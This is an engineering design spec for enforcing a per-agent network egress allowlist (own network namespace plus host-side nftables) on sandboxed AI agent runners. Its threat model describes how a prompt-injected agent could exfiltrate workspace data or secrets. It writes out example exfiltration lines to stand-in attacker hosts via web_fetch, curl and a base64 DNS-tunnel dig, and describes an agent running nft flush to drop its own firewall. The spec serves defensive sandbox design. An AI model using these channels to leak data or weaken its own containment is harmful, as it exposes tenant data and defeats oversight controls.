# M84_004: Runner egress allowlist (launch slice) — Phase-2 nftables enforcement of the per-zombie NetworkPolicy

**Prototype:** v2.0.0
**Milestone:** M84
**Workstream:** 004
**Date:** Jun 05, 2026 (re-scoped to the launch slice Jun 10, 2026 after a code-grounded adversarial review)
**Status:** IN_PROGRESS
**Priority:** **P1 — launch-critical security boundary (re-classified Jun 10, 2026; threat model corrected Jun 10 against code).** Closes the **day-1** exfiltration path M84_003 leaves open *on trusted runners*: the network-enabled tier shares the host network namespace with no egress restriction, and the per-zombie allowlist is honored by **only** the `http_request` tool — `web_fetch` is allow-all (`allowed_domains = &.{}`) and `bash` is `policy = null`. A prompt-injected agent uses those unpoliced tools to exfiltrate the **workspace data it is handling** (cloned private repo, fetched files, issue/PR text) to any host and to weaponize the box against third parties. The tenant's secret **values** are better protected — materialized only inside `http_request` (substitution + L7 allowlist + redaction), so the unpoliced tools cannot route them — leaving the secret-value residual to an *allowed write-capable host* (§4.1), which scoped/short-lived tokens (still unbuilt: `secrets_resolve.zig:48` verbatim, no Time-To-Live; `docs/AUTH.md:204` static long-lived) must close, not this slice.
**Categories:** API
**Batch:** B1 — standalone; rides M84_003's `appendBwrap` argv + the `test-integration-runner` lane (both merged, #370).
**Branch:** feat/m84-runner-egress-allowlist
**Depends on:** **M84_003 — DONE (merged #370).** M84_003 stopped the *daemon's* `ZOMBIE_RUNNER_TOKEN` getting *in* (filtered `environ_map`); this slice stops the *tenant's own* secrets getting *out*. They share the `appendBwrap` / network-policy surface; M84_003 has landed, so there is no rebase wait.
**Provenance:** agent-surfaced in the Orly Chief Technology Officer (CTO) adverse review of M84_003 (Jun 05, 2026); **re-scoped to a launch pull-forward in the Jun 10, 2026 adversarial review** (three-agent, code-grounded against `main`) which refuted the deferral — the stated compensating control is unbuilt and the exfil is trivially exploitable on a trusted runner day-1.

> **Provenance is load-bearing.** Every claim was verified by reading `network.zig`, `runner_network_policy.zig`, `sandbox_args.zig`, `src/lib/contract/execution_policy.zig` (`NetworkPolicy`), `src/zombied/zombie/yaml_frontmatter.zig` (TRIGGER.md `network.allow` parse), `tool_bridge.zig`, `tool_builders.zig`, `secrets_resolve.zig`, `protocol_test.zig`, `docs/SKILL_FRONTMATTER_SCHEMA.md`, and `docs/AUTH.md` under an adversarial lens. Re-confirm at PLAN.

**Canonical architecture:** [`docs/architecture/runner_fleet.md`](../../architecture/runner_fleet.md) §Sandbox tiers / §Egress model and [`docs/architecture/data_flow.md`](../../architecture/data_flow.md) (the "never escapes the sandbox" guarantee). This workstream makes the egress half of that guarantee true for the network-enabled tier.

---

> **LAUNCH SLICE — pulled forward (adversarial review + Indy, Jun 10, 2026).** This spec was originally deferred *whole* behind untrusted-runner General Availability (GA), on the theory that $-capped keys + least-privilege tool secrets bound the exfil risk at launch. A code-grounded adversarial review (Jun 10) refuted that on every count:
> 1. **The network-enabled `registry_allowlist` tier — which prod baremetal explicitly sets (`RUNNER_NETWORK_POLICY=registry_allowlist`, `deploy/baremetal/zombie-runner.service:38`) — emits `--share-net`** (after `sandbox_args.zig:126`'s `--unshare-all`; `network.zig:73`), so the child shares the host network namespace with **zero** egress filter (`runner_network_policy.zig` — the allowlist is "logged for observability only; TCP-layer restriction is **Phase 2 (nftables)**"). *(The code default is `deny_all` — no network at all.)*
> 2. **The per-zombie allowlist is honored by only the `http_request` tool.** `web_fetch` is built with `allowed_domains = &.{}` — NullClaw treats empty as **allow-all** (`web_fetch.zig:24`/`:66`) — `bash` is built `.policy = null` (`tool_builders.zig` `buildShell`), and `web_search`/`git` carry no egress policy either. So a hijacked agent runs `web_fetch(https://attacker/?leak=…)` or `bash: curl --data @/workspace/<file> https://attacker` to exfiltrate the **workspace data it is handling** to any host, and to scan/flood third parties. *(Secret **values** are not reachable this way — point 3.)*
> 3. **Secret *values* are well-protected; their one residual channel needs an unbuilt control.** The value is materialized only inside `http_request` (`secret_substitution.zig`, post-sandbox boundary), L7-allowlist-checked, and redacted from frames — the agent never sees it and `bash`/`web_fetch` cannot route it (no substitution outside `http_request`; `git` has no creds wired, `buildGit`). The residual: with github.com in the allowlist (platform-ops needs it), the agent POSTs `${secrets.github.token}` to an attacker-controlled gist *on the allowed host*. The **egress allowlist does not close that** — scoped/short-lived tokens do, and they are vaporware (`secrets_resolve.zig:48` reads vault creds verbatim, no Time-To-Live/scoping; lease carries the raw secret inline, `protocol_test.zig:239`; `docs/AUTH.md:204` static long-lived). The $-cap bounds LLM *spend*, not a leaked `ghp_` token's blast radius (repo/org write, unrevocable by usezombie). → §4.1.
>
> **Indy decision (verbatim, Jun 10, 2026):** _"I want to go with 1"_ — option 1 = pull the **host-side nftables IP-allowlist** slice forward for launch; defer the Layer-7 (L7) DNS-pinning proxy to untrusted-runner GA.
>
> **This spec ships in two slices:**
> - **Launch Slice (ship now — this PR):** §1 own-netns (drop `--share-net`) + §2 in-netns **nftables IP-allowlist** (default-deny; allow only the resolved IPs of the **per-zombie `NetworkPolicy`** — TRIGGER.md `network.allow` + the 8 `REGISTRY_ALLOWLIST` baseline hosts + the inference endpoint) + §3 parent-owned (it is the existing lease-carried `NetworkPolicy`, not a new parse). Closes **arbitrary-host** exfil — the wide-open `curl $secret → anywhere` case, ~the entire practical attack surface. Rides M84_003's bwrap/lane work.
> - **Deferred to untrusted-runner GA (§5 — do NOT build for launch):** the L7 DNS-pinning forward proxy (name-based Server-Name-Indication (SNI) / `CONNECT` allowlisting for rotating Content Delivery Networks (CDNs), DNS-rebinding pin, encrypted-SNI / DNS-over-HTTPS default-deny). It is the refinement the *untrusted* tier needs when the operator's host list cannot be trusted and CDN IP sets churn; the trusted launch allowlist (inference + 8 registries) is small and stable, so resolve-to-IP-at-setup suffices.
>
> **Honest residual (does NOT close at launch — say so out loud):** an allow-listed write-capable host (github.com, which the agent legitimately needs) remains an exfil channel by design. Only short-lived / scoped tokens — a credential-model change, **NOT** this spec — close that last sliver. (A second classic channel — **DNS tunnelling** through a forwarding resolver — is *closed* by this slice via parent-only resolution, §3.3, not left as a residual.) This slice shrinks the blast radius from **"the entire internet"** to **"a handful of known hosts."**

## Implementing agent — read these first

1. `src/runner/engine/network.zig` — `PolicyMode` (`deny_all` / `registry_allowlist`) and `appendNetworkArgs`; today `registry_allowlist` emits `--share-net` and only `log.debug`s the allowlist (lines ~68-76). This surface changes from "share host netns + log" to "own netns + host-side nftables IP-allowlist".
2. `src/runner/engine/runner_network_policy.zig` — `REGISTRY_ALLOWLIST` (the registry **baseline**, lines ~13-22), **already merged per-zombie with `config.network.allow`** (M2_001/M3_001). Its own header names the gap this workstream closes: *"logged for observability only — TCP-layer restriction is **Phase 2 (nftables)**."* This spec **is** that Phase 2 — it enforces the existing merged allowlist; it does not invent a new one.
3. `src/runner/sandbox_args.zig` — `appendBwrap`; where `--unshare-all` / `--share-net` are decided. The child must keep an **unshared** net namespace on every sandboxed tier, with a veth pair as its only route to the nftables-filtered host hop.
4. `src/lib/contract/execution_policy.zig` — `NetworkPolicy` is the **per-execution egress allowlist** ("invariant for its lifetime", deny-all default) **already carried to the runner per-lease**, sourced from the zombie's TRIGGER.md `x-usezombie.network.allow` (parsed at `src/zombied/zombie/yaml_frontmatter.zig`). **This is the allowlist to resolve → IPs and install in nftables — there is no new `allow_hosts` parse.**
5. `src/runner/engine/runner.zig` §memory + `build_runner.zig` (`.engines = "base,sqlite"`) — proof the child holds **no** database credential and makes **no** datastore connection (Invariant 3); durable memory is the control plane's job over HTTPS.
6. `dispatch/write_zig.md` — all `*.zig` edits.

---

## PR Intent & comprehension handshake

- **PR title (eventual):** `feat(m84): runner egress allowlist (launch slice) — own-netns + host-side nftables IP allowlist`
- **Intent (one sentence):** A prompt-injected sandboxed agent can `connect()` only to the IPs the zombie's `NetworkPolicy` resolves to (TRIGGER.md `network.allow` + the `REGISTRY_ALLOWLIST` baseline + the inference endpoint/gateway); every other destination — arbitrary exfil targets, raw IPs, link-local, the host LAN — is dropped by **nftables in the child's own network namespace**, not merely logged.
- **Handshake (agent fills at PLAN, before EXECUTE):** restate intent; list `ASSUMPTIONS I'M MAKING:`. **Confirm the enforcement point** (own-netns + host-side nftables IP-allowlist) and that the resolved IP set includes the configured inference endpoint(s)/gateway — a too-tight set silently breaks every lease (the agent cannot reach its Large Language Model (LLM)); a too-loose one re-opens exfil. **Confirm the IP-resolution moment** (parent resolves the lease's `NetworkPolicy` hostnames → IP set at lease setup; `NetworkPolicy` is session-fixed so the child never resolves or widens it).

---

## Applicable Rules

- **`docs/greptile-learnings/RULES.md`**:
  - **RULE UFS** — the allowlist seed (`REGISTRY_ALLOWLIST`), the nftables table/chain names, the veth/subnet constants, and any bwrap net flags are single-sourced named constants, reused by builder + tests — never re-spelled.
  - **RULE NLG** — pre-2.0: the `--share-net` behaviour is **replaced**, not shimmed; no "legacy network mode" framing.
  - **RULE NDC / NLR** — no dead code; the log-only `log.debug("allowlist_host", …)` line is removed when enforcement lands (it becomes real), not left beside the new path.
- **`dispatch/write_zig.md`** — tagged-union results, `errdefer`, cross-compile both linux targets.
- **`docs/AUTH.md`** — the inference `api_key` and tool secrets cross into the child on the lease; this workstream constrains where the child can *send* them, and must not change how they are delivered.
- **`docs/LOGGING_STANDARD.md`** — any `egress_denied` / `egress_allowed` emit follows the logfmt envelope; never log a secret or a full URL with query; host/IP only.

## Applicable Gates

| Gate | Fires? | Satisfaction strategy |
|------|--------|-----------------------|
| ZIG GATE | **yes** — `*.zig` edits | Read `dispatch/write_zig.md`; cross-compile both linux targets. |
| UFS | **yes** — allowlist seed + nftables table/chain + veth constants | Named constants in `network.zig` / `runner_network_policy.zig`, reused in tests. |
| LENGTH (≤350/≤50/≤70) | **maybe** — `network.zig` grows (netns + veth + nft emit) | Extract a netns/nftables emit helper so `appendNetworkArgs` stays ≤50 lines. |
| LOGGING | **yes** — new egress-decision emit | Envelope unchanged; host/IP only, never the secret or full URL. |
| LIFECYCLE | **maybe** — netns / veth / nft handle ownership | The veth + nft ruleset are torn down with the lease's netns; `errdefer`-clean on the setup path. **No per-lease proxy process** to own (one reason the IP-allowlist slice is simpler than the deferred proxy). |
| SCHEMA / ERROR REGISTRY | **maybe ERROR REGISTRY** — a distinct `egress unavailable` failure class | If the lease fails closed when the netns/nft setup fails, register/reuse the sandbox-establish failure code; no schema. |

---

## Overview

**Goal (testable):** On a network-enabled sandboxed tier, the child runs in its **own** network namespace and can `connect()` only to the IPs the operator's allowlist resolves to (inference endpoint/gateway + registry seed + declared `allow_hosts`); a `connect()` to any other IP — `attacker.example`'s address, a raw arbitrary IP, link-local, the host LAN — is **dropped by host-side nftables on the veth** (host netns, root-owned — Invariant 6), proven by a negative test, while a legitimate LLM call and an allowed-host tool call still succeed.

**Problem:** The only network-enabled tier (`registry_allowlist`) emits bubblewrap `--share-net` — the child **joins the host network namespace** — and the allowlist is **log-only** (`network.zig:68-76`, `runner_network_policy.zig:5-9`). So a sandboxed agent has **full host egress**. The per-zombie allowlist is honored by **only** the `http_request` tool; `web_fetch` is allow-all (`allowed_domains = &.{}`) and `bash` is `policy = null`, so a prompt injection (platform-ops agents read untrusted issue/PR text by design) uses those unpoliced tools to exfiltrate the **workspace data the agent is handling** (cloned private repo, fetched files, the issue/PR text under triage) to any host, and to weaponize the box. The tenant's secret **values** (inference `api_key`, tool tokens, delivered inline on the lease, `protocol_test.zig:239`) are materialized only inside `http_request` (substitution + L7 allowlist + redaction) and are *not* reachable through the unpoliced tools — their residual is exfil via an *allowed* write-capable host (§4.1). M84_003's `environ_map` removed only the *daemon's* token; the tenant's **data egress path** is untouched. **The per-zombie allowlist already exists and rides the lease** — TRIGGER.md `network.allow` → `NetworkPolicy` (`execution_policy.zig`) → merged with `REGISTRY_ALLOWLIST` (M2_001/M3_001) — but it is **only logged, not enforced** (Phase 1: `--share-net` + `log.debug`). The plumbing is built; the kernel enforcement is the gap this workstream fills.

**Solution summary (launch slice):** Stop sharing the host network namespace. The sandboxed child keeps an **unshared** net namespace connected to the host by one veth pair, and the parent installs **default-deny nftables rules in the host netns, on the host-side veth** (root-owned, Invariant 6 — never inside the child's netns) that permit egress only to the **IP set resolved at lease setup from the per-zombie `NetworkPolicy`** (TRIGGER.md `network.allow` ∪ `REGISTRY_ALLOWLIST` baseline ∪ inference endpoint — the set already merged per M2_001/M3_001 and carried on the lease). Everything else is dropped at the kernel. The zombie's declared `network.allow` — which the schema already calls *"a kernel-level egress rule, rejected at packet time"* — becomes that real kernel boundary instead of a log line. Legitimate inference and allowed-host tool traffic are unchanged; arbitrary exfil and lateral reach are removed. The L7 *name*-based proxy (for rotating-CDN allowlists on the untrusted tier) is **deferred to §5**.

**Prioritization.** This is the **#1 residual risk for the real deployment** after M84_003: on a baremetal outbound-only node there is no metadata endpoint and no co-located datastore to attack, so lateral movement is moot — the surviving threat is **outbound exfiltration of the tenant's workspace data (and box-abuse)** via the unpoliced tools (`web_fetch` allow-all, `bash` no-policy), and the launch slice closes the arbitrary-host half cheaply by making the allowlist apply to **every** tool at the kernel. (Secret *values* are largely protected by substitution + L7 + redaction; their residual is the allowed write-capable host, §4.1.)

---

## Prior-Art / Reference Implementations

- **Untrusted-code egress firewall pattern (IP layer)** — give the workload its own network namespace with no default route except a veth to the host, and install nftables drop-all-except rules for the resolved allowlist IPs. This is the L3/L4 enforcement the launch tier needs for a small, stable host set. (The L7 SNI/`CONNECT` proxy — old §2 — is the name-layer refinement deferred to §5.)
- **Resolve-at-setup IP pinning** — the parent resolves each allowed name to its current IP(s) at lease setup and pins the nft set for the lease's lifetime; this is the trusted-tier analogue of DNS-pinning without a proxy. Its limitation (rotating CDN IPs mid-lease) is bounded for the small launch set and noted in Failure Modes.
- **`REGISTRY_ALLOWLIST`** (`runner_network_policy.zig`) — the existing host list is the enforced-set seed; do not re-spell it.

---

## Files Changed (blast radius)

| File | Action | Why |
|------|--------|-----|
| **`src/runner/network/` (NEW dir)** | CREATE | File-as-struct (`@This()`) modules, std-inspired (facade like `std.net`): `Allowlist.zig` (merged egress allowlist — **operator-fed** registry ∪ `network.allow` ∪ inference host; single source for L4+L7), `Plan.zig` (veth params + `/etc/hosts`/`resolv.conf` render), `MessageBuilder.zig` + `rtnetlink.zig` + `nfnetlink.zig` (pure netlink serializers — golden-byte tested), `Socket.zig` (`AF_NETLINK`, Linux-gated), `EgressScope.zig` (lifecycle `create`/`attachChild`/`destroy`, mirrors `engine/cgroup.zig`), `Policy.zig` (`Mode` + env parse), `network.zig` (facade). All addresses use `std.Io.net.IpAddress`. |
| `src/runner/engine/network.zig` + `engine/runner_network_policy.zig` | DELETE (migrate) | Fold into `network/Policy.zig` + `network/Allowlist.zig` (RULE NLR/NLG — move, don't shim). The dead `mergeAllowlists` + the log-only `--share-net` path go; importers (`sandbox_args`, `daemon/config`) repoint to `network`. |
| `src/runner/sandbox_args.zig` | EDIT | No `--share-net` on any tier (child stays `--unshare-all`); `--ro-bind` the per-lease `/etc/hosts` + neutered `/etc/resolv.conf` (paths from `Plan`). |
| `src/runner/daemon/config.zig` | EDIT | Parse `RUNNER_REGISTRY_ALLOWLIST` (comma-separated) at load → `registry_allowlist: []const []const u8`, fed into `Allowlist.build` — the registry baseline is **operator-configurable, fed from outside, not a compile-time constant** (a named default is fallback only). |
| `src/runner/child_supervisor.zig` | EDIT | `establishEgress()` — resolve allowlist + `EgressScope.create` before fork, `.attachChild(pid)` after, `defer .destroy()`, fail-closed to `UZ-RUN-007`. |
| `src/runner/engine/tool_builders.zig` | EDIT | `http_request`/`web_fetch`/`web_search` consume the same merged `Allowlist` (L7 legibility); closes the `allowed_domains = &.{}` allow-all + the L4/L7 split-brain. |
| `src/lib/contract/execution_policy.zig` (`NetworkPolicy`) | READ (no new parse) | The per-zombie allowlist is **already carried** here (TRIGGER.md `network.allow`, merged per M2_001/M3_001). The new work **resolves** its hostnames → an IP set at lease setup and hands it to the nftables installer — no new `allow_hosts` parsing. |
| `src/lib/contract/execution_policy.zig` (`ExecutionPolicy`) + `src/zombied/fleet/service.zig` | EDIT (control-plane) | The control plane authors the **resolved inference endpoint host** onto the lease (it already resolves the provider in `tenant_provider_resolver`), so the parent allowlists exactly the host the engine dials — no child-side URL-derivation drift (Dim 3.1). |
| `ExecutionResult.blocked_egress` + per-lease DNS stub | DEFERRED follow-up | Structured, parent-owned author-facing denial chip — needs a DNS stub to capture off-list query names. Launch uses best-effort fast-fail surfacing (Dim 3.4); build only if that proves thin. |
| `src/runner/network/*` in-file `test` blocks + `network/egress_scope_integration_test.zig` | CREATE | Std-style in-file tests: pure (`Allowlist`/`Plan`/builders — golden bytes, run on macOS); **Linux-only integration** (allowed IP reachable, denied dropped, link-local/private dropped, fail-closed, child-can't-`nft flush`, per-lease isolation, DNS fast-fail) on the `test-integration-runner` lane. Registered in `src/runner/tests.zig`. |
| `make/test-integration.mk` | EDIT | Register the egress integration tests on the `test-integration-runner` lane (created in M84_003). |
| `docs/architecture/runner_fleet.md` | EDIT (small) | Document the launch egress model (own-netns + nftables IP-allowlist) under §Sandbox tiers, and note the L7 proxy as the untrusted-GA follow-up. |

---

## Decomposition & alternatives (patch vs refactor)

- **Chosen shape (launch slice):** one atomic workstream (B1) — own-netns + host-side nftables IP-allowlist + parent config/resolution plumbing share the network path; separate tests. It is a **refactor of the network tier** (the `--share-net` model is replaced), behaviour-preserving for the legitimate inference/allowed-host path.
- **Mechanism (LOCKED — Indy, Jun 10, 2026): Phase-2 host-side nftables enforcement of the existing `NetworkPolicy`.** The parent resolves the per-zombie allowlist (TRIGGER.md `network.allow` ∪ `REGISTRY_ALLOWLIST` ∪ inference endpoint — already merged per M2_001/M3_001 and carried on the lease) → an IPv4/IPv6 set at lease setup, and installs `nft` drop-all-except rules in the **host netns on the host-side veth** (root-owned — Invariant 6; never in the child's netns). This is exactly the *"Phase 2 (nftables)"* the `runner_network_policy.zig` header already names — the allowlist is built and carried; only the kernel enforcement is new. Rationale: the launch allowlist is small and largely static, so resolve-at-setup pins it for the lease with no L7 machinery and no per-lease process.
- **Alternatives considered:**
  - **(a — DEFERRED to §5) L7 DNS-pinning forward proxy** — name-based SNI/`CONNECT` allowlisting; the correct layer for *names* on rotating CDNs and for forged-SNI / DNS-rebinding resistance. Heavier (a long-lived host proxy + SNI parsing + connect-IP pinning) and only required when the host set is large/rotating or operator-untrusted — i.e. the untrusted-runner tier. Deferred there.
  - **(b) Keep `--share-net`, add host-global firewall rules** — rejected: rules on a shared namespace mutate the *host's* networking and cannot be per-lease.
  - **(c) Force `deny_all` until enforcement exists** — rejected as the end state (the agent's LLM call needs egress); it remains the honest **interim** posture (Out of Scope / Failure Modes) only if this slice itself slips before launch.

---

## Sections (implementation slices)

### §1 — The sandboxed child runs in its own network namespace (no `--share-net`)

The child must never join the host network namespace. On a network-enabled tier it keeps an **unshared** net namespace whose only route out is a veth pair to the host, gated by the §2 nftables rules; with no rules installed it has no egress at all (fail-closed). This removes the "full host egress" property at its root — direct connects to anywhere (host loopback, the host LAN, the wider internet) fail unless the destination IP is in the allowlist.

- **Dimension 1.1** — no sandboxed tier emits `--share-net`; the child's net namespace is unshared on `deny_all` AND the network-enabled tier → Test `test_no_share_net_on_any_sandboxed_tier`
- **Dimension 1.2** — with no allowlist rules installed (setup failure), the child has **no** egress (fail-closed, not fall-open to the host network) → Test `test_egress_fails_closed_without_rules`

### §2 — Default-deny host-side nftables IP-allowlist (the allowlist enforced)

The runner installs the nftables ruleset in the **host** network namespace, on the **host-side veth interface** (forward chain, `oifname "<veth-host>"`) — **NOT** inside the child's netns, which the child's user namespace owns and could `nft flush` (Invariant 6). Those host-side rules DROP all of the child's egress except to the resolved allowlist IPs (name resolution is **parent-provided** per §3.3 — no forwarding resolver is reachable from the child). The child's netns holds only its veth end + a default route to the host; the host LAN, link-local, and private ranges (except the veth subnet) are denied.

- **Dimension 2.1** — a connect to an allowed IP (the resolved inference endpoint) succeeds → Test `test_allowed_ip_reachable`
- **Dimension 2.2** — a connect to a non-allowed IP is dropped by nftables → Test `test_denied_ip_dropped` (+ `egress_denied` logged, IP only)
- **Dimension 2.3** — link-local (`169.254.0.0/16`), loopback-to-host, and RFC1918 private ranges (outside the veth subnet) are dropped — defense-in-depth even on baremetal where no metadata service exists → Test `test_link_local_and_private_denied`

### §3 — Per-zombie `NetworkPolicy` → resolved IP set (parent-owned)

The allowlist is the zombie's **already-carried** `NetworkPolicy` (`src/lib/contract/execution_policy.zig`) — sourced from TRIGGER.md `x-usezombie.network.allow`, merged with the `REGISTRY_ALLOWLIST` baseline per M2_001/M3_001, and always ∪ the configured inference endpoint(s)/gateway. The parent **resolves those names → IPs at lease setup** and installs the nft set. `NetworkPolicy` is "invariant for the session's lifetime" and parent-carried, so the child cannot widen it mid-run — Invariant 4 holds natively. (No new `allow_hosts` parse: the set already exists on the lease; this workstream resolves + enforces it.)

- **Dimension 3.1** — the resolved IP set always contains the configured inference endpoint/gateway. The **control plane authors the resolved inference host onto the lease** (`ExecutionPolicy` — it already resolves the provider in `tenant_provider_resolver`), so the parent allowlists *exactly* the host the engine will dial — no parent-side URL derivation that could drift from the engine's. A lease whose inference host is unresolvable fails closed at setup, not mid-run → Test `test_inference_host_always_allowed`
- **Dimension 3.2** — `allow_hosts` is a parent-only read; nothing in the child's environment or lease can extend the nft set → Test `test_allowlist_not_child_extendable`
- **Dimension 3.3 (DNS-tunnel closure)** — the child cannot reach a **forwarding** DNS resolver: name→IP resolution is parent-provided via a **static `/etc/hosts`** injected into the child (the allowlist names → their lease-setup-resolved IPs); **nftables drops ALL egress to port 53**, so no resolver — forwarding or otherwise — is reachable. DNS-tunnel exfil is closed by the *absence of any resolver* (nothing to misconfigure — the simplest possible closure). This **closes the DNS-tunnel exfil channel** — `dig $(echo $TOKEN | base64).attacker-ns.com @<resolver>` encodes the secret in the query name and reaches an attacker's authoritative nameserver *through* a forwarding resolver, which the IP-allowlist alone cannot see (the connect target is the *allowed* resolver IP). → Tests `test_no_forwarding_resolver_reachable` + `test_dns_tunnel_query_dropped`
- **Dimension 3.4 (author-facing denial — the end user learns *why* a host was blocked)** — a denied egress is **not silent**. A host the author forgot to declare misses the static `/etc/hosts` and, with port 53 dropped, fails **fast at resolution** (`could not resolve host: api.stripe.com` — no 30-second hang, no lease wall-clock burned on a dead socket); that hostname rides the tool's error output into the agent's turn, and the `http_request` tool additionally returns its **existing** structured L7 off-list error (`policy_http_request.zig`). This already kills the silent-timeout problem. The **structured, parent-owned `ExecutionResult.blocked_egress` field** — a guaranteed, tamper-proof *"blocked: api.stripe.com — add to network.allow"* chip on the run detail — **requires a per-lease DNS stub** (only a resolver process can capture an off-list query name) and is therefore **deferred to a fast follow-up**, built only if best-effort narration proves thin (Indy, Jun 10: keep launch simple). → Test `test_denied_named_host_fails_fast_at_resolution`

### §4 — Honest residual channels (no code; documented)

The allowlist caps the *blast radius*; it is not a complete exfil seal, and the spec says so out loud so operators do not over-trust it.

- **Dimension 4.1** — an allowed host that itself accepts attacker-readable writes (e.g. github.com for a platform-ops agent) is still an exfil channel **by design** — documented, with the real mitigation being short-lived / least-privilege tenant secrets (a separate credential-model change), not the network layer → recorded in Discovery + an operator note (no code).
- **DNS tunnelling — CLOSED by design (§3.3), not an accepted residual.** A forwarding resolver reachable from the child would let an agent smuggle secrets in DNS query names regardless of the IP-allowlist; §3.3 closes it (static `/etc/hosts` + **all** port-53 egress dropped — no resolver reachable at all). Called out here so a future maintainer does not silently re-open it by "just allowing port 53 to a resolver." The only standing residual is §4.1 (a write-capable allowed host).

### §5 — DEFERRED to untrusted-runner GA: L7 DNS-pinning forward proxy

> **Do NOT implement from this file for launch.** When usezombie commits to untrusted / customer-operated runners, the IP-allowlist is refined with a name-layer forward proxy: SNI/`CONNECT` hostname allowlisting (for rotating-CDN host sets the IP-pin cannot track), DNS-rebinding resistance (pin the connect IP to the proxy's own resolution), and encrypted-SNI / DNS-over-HTTPS default-deny (the proxy cannot see an encrypted name → drop). This is the layer that matters when the operator's host list is untrusted and CDN IP sets churn faster than a lease. It becomes its own workstream at untrusted-GA scoping; the launch nft IP-allowlist (§1–§3) is the foundation it sits on.

---

## Interfaces

> **Illustrative — exact flags / nftables mechanism verified at PLAN.** Contract, not implementation.

```
# Network policy (the per-zombie NetworkPolicy, ALREADY carried on the lease — execution_policy.zig)
#   - PolicyMode stays { deny_all, <network_enabled> }; network_enabled NO LONGER means --share-net.
#   - allowlist = TRIGGER.md network.allow  ∪  REGISTRY_ALLOWLIST baseline  ∪  {inference endpoint/gateway}
#                 (already merged per M2_001/M3_001 — NOT a new operator allow_hosts parse).
#   - resolved at LEASE SETUP (parent) to an IP set; NetworkPolicy is session-fixed → child never widens it.
# Child network namespace (own, not shared):  veth-child <-> veth-host
# Egress enforcement — in the HOST netns, on the HOST-SIDE veth (root-owned, Invariant 6; NOT the child netns):
#   nft add rule inet filter forward oifname "<veth-host>" ... : default DROP, ACCEPT only resolved allowlist IPs.
#   name resolution is PARENT-PROVIDED: a static /etc/hosts (allowlist names -> setup-resolved IPs).
#   nftables DROPS ALL egress to port 53 -> NO resolver (forwarding or otherwise) is reachable (§3.3).
# Enforcement contract:
#   child connect(ip) succeeds  IFF  ip ∈ resolved-allowlist-IPs   (no port-53 path to a forwarding resolver)
#   else  -> dropped by nftables (logged: host/IP only, never secret/full-URL)
#   denied NAMED host (/etc/hosts miss, :53 dropped) -> fast resolution failure (no 30s hang); the name
#                          rides the tool error into the agent's output (structured blocked_egress -> follow-up)
#   no rules installed (setup failure) -> child has NO egress (fail-closed)
```

Contract: the legitimate path (inference endpoint + declared `allow_hosts`, rules installed) is observably unchanged — the agent's LLM call and allowed tool calls still work; only non-allowed destinations are newly dropped.

---

## Failure Modes

| Mode | Cause | Handling (system response + what the caller observes) |
|------|-------|--------------------------------------------------------|
| Allowlist too tight | inference endpoint/gateway omitted from `allow_hosts` | lease fails **closed at setup** (not mid-run); operator widens the declared list. Caught by `test_inference_host_always_allowed`. |
| Undeclared **named** tool host | the agent dials a host the author forgot to put in `network.allow` (e.g. `api.stripe.com`) | static `/etc/hosts` miss + port 53 dropped → the tool fails **fast at resolution** (not a 30s hang); the hostname rides the tool error into the agent's output (best-effort) and `http_request` returns its structured L7 error. **Not** a lease failure — the run continues. Structured `blocked_egress` chip → follow-up. Caught by `test_denied_named_host_fails_fast_at_resolution`. |
| Allowlist too loose | an exfil-capable host added | by design the operator's call; §4.1 documents that write-capable allowed hosts remain channels — mitigate via least-privilege secrets, not nftables. |
| **Rotating CDN IPs mid-lease** | a provider (github.com, api.anthropic.com) rotates to an IP not in the resolved set during a long lease | the connect to the new IP drops. **Launch mitigation:** the launch set (inference + 8 registries) is small/stable, resolved at setup; for long leases, PLAN decides periodic re-resolve OR a provider CIDR allowance. The complete fix (name-layer) is the deferred §5 proxy. Document the limitation; don't silently widen to a CIDR that re-opens exfil. |
| nft/netns setup fails | kernel/permission error installing rules | child has **no** egress (fail-closed); lease classified a sandbox/egress failure, never falls back to open net. `test_egress_fails_closed_without_rules`. |
| In-child forwarding resolver | an implementer "just allows port 53" to a real/recursive resolver | **reopens DNS-tunnel exfil** (`dig data.attacker-ns.com @resolver` smuggles secrets in query names past the IP-allowlist). Forbidden by §3.3: child resolution is parent-provided / non-forwarding-stub only. Caught by `test_dns_tunnel_query_dropped`. |
| Child disables its own firewall | a prompt-injected agent runs `nft flush` / `ip route del` inside its netns | **no effect** — the rules are root-owned on the host side of the veth (Invariant 6); the child's namespace-local caps don't reach them. Caught by `test_child_cannot_flush_egress_rules`. |
| Open-net half-state | a logic bug emits `--share-net` AND skips the nft install | **forbidden** — own-filtered-netns XOR host-share, and setup failure is fail-closed (Invariant 7); the child is never in the host netns without nft. Caught by `test_no_open_net_half_state`. |
| Operator runs `deny_all` | no network configured | unchanged — empty netns, no veth; the agent has no egress (correct for non-network agents). |

---

## Invariants

1. **No host-netns sharing** — no sandboxed tier emits `--share-net`; the child's net namespace is always unshared. Enforced by `test_no_share_net_on_any_sandboxed_tier`.
2. **Default-deny egress (nftables)** — a destination IP not in the resolved allowlist is dropped by **host-side nft on the veth** (host netns, root-owned — Invariant 6); the child's only route is the veth, and **no forwarding DNS resolver is reachable** (§3.3) so secrets cannot tunnel in DNS query names. Enforced by `test_denied_ip_dropped` + `test_egress_fails_closed_without_rules` + `test_dns_tunnel_query_dropped`.
3. **No datastore credential in the child** — the runner is built `base,sqlite` (`build_runner.zig`); the child holds no database connection string and opens no datastore socket; durable memory is the control plane's HTTPS responsibility. **Never build the runner with `-Dengines=postgres`.** Enforced by a build-config assertion + the absence of a DB host in the resolved allowlist.
4. **Allowlist is parent-owned** — nothing in the child's environment or lease can widen the resolved nft set. Enforced by `test_allowlist_not_child_extendable`.
5. **Legitimate path unchanged** — inference endpoint + declared `allow_hosts` (rules installed) produce an identical observable outcome; a golden-arg/integration test pins it.
6. **Egress rules are root-owned and child-unreachable** — the netns / veth / nftables config is installed by the **root daemon on the host side of the veth** (or in a netns the child's user namespace does **not** own). The sandboxed child holds only namespace-local capabilities and **cannot `nft flush`, alter routes, or reconfigure the veth** to widen its own egress. Enforced by `test_child_cannot_flush_egress_rules`.
7. **Fail-closed, never a half-open state** — any netns/veth/nft setup failure yields **no egress** (the lease is refused as a sandbox/egress failure); there is **no** fallback to `--share-net` / open net. The build is own-filtered-netns **XOR** host-net-share — it must never leave the child in the host netns *without* nft installed. Enforced by `test_egress_fails_closed_without_rules` + `test_no_open_net_half_state`.

---

## Test Specification (tiered)

